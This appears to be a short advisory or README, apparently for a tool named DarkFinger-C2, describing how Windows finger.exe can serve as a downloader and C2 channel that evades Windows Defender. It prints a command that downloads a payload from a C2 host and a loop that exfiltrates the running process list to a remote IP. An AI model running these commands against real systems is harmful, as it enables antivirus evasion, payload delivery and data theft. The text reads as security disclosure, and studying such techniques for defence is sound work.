# DarkFinger-C2
Windows TCPIP Finger Command / C2 Channel and Bypassing Security Software

http://hyp3rlinx.altervista.org/advisories/Windows_TCPIP_Finger_Command_C2_Channel_and_Bypassing_Security_Software.txt

Microsoft Windows TCPIP Finger Command "finger.exe" that ships with the OS, can be used as a file downloader and makeshift C2 channel.
Legitimate use of Windows Finger Command is to send Finger Protocol queries to remote Finger daemons to retrieve user information.
However, the finger client can also save the remote server response to disk using the command line redirection operator ">".

Intruders who compromise a computer may find it is locked down and "unknown" applications may be unable to download programs or tools.
By using built-in native Windows programs, its possible they may be whitelisted by installed security programs and allowed to download files.

Redteams and such using LOL methods have made use of "Certutil.exe", native Windows program for downloading files. However, Certutil.exe is
recently blocked by Windows Defender Antivirus and logged as event "Trojan:Win32/Ceprolad.A" when it encounters http/https://.

Therefore, using Windows finger we can bypass current Windows Defender security restrictions to download tools, send commands and exfil data.
The Finger protocol as a C2 channel part works by abusing the "user" token of the FINGER Query protocol "user@host". C2 commands masked as
finger queries can download files and or exfil data without Windows Defender interference.

Download files:
C:\> finger <C2-Command>@HOST > Malwr.txt

Exfil running processes:
C:\> for /f "tokens=1" %i in ('tasklist') do finger %i@192.168.1.21

PoC
https://www.youtube.com/watch?v=cfbwS6zH7ks


